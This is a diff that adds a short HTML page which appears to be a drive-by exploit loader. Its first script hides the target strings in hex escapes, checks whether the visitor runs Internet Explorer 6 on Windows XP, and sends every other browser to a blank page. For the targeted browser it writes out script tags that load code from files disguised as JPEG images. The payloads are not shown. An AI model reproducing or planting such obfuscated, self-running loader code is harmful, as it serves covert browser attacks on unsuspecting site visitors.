@@ -1,0 +1,19 @@
+<html>
+<script>
+nav=navigator.userAgent.toLowerCase();
+wxp=((nav.indexOf('\x77\x69\x6e\x64\x6f\x77\x73\x20\x6e\x74\x20\x35\x2e\x31')!=-1)||(nav.indexOf('windows xp')!=-1));
+if(!wxp||navigator.userAgent.toLowerCase().indexOf("\x6D"+"\x73"+"\x69\x65 \x36")==-1) location.replace("about:blank");
+</script>
+<script language="JavaScript">
+document.writeln("<html> ");
+document.writeln("<body>  ");
+document.writeln("<div id=\"DivID\"> ");
+document.writeln("<script src=\'bb1.jpg\'><\/script>  ");
+document.writeln("<script src=\'bb.jpg\'><\/script> ");
+document.writeln("<script src=\'bb2.jpg\'><\/script>  ");
+document.writeln("<script src=\'bb4.jpg\'><\/script>  ");
+document.writeln("<script src=\'bb3.jpg\'><\/script>  ");
+document.writeln("<\/body> ");
+document.writeln("<\/html>");
+</script>
+</html>
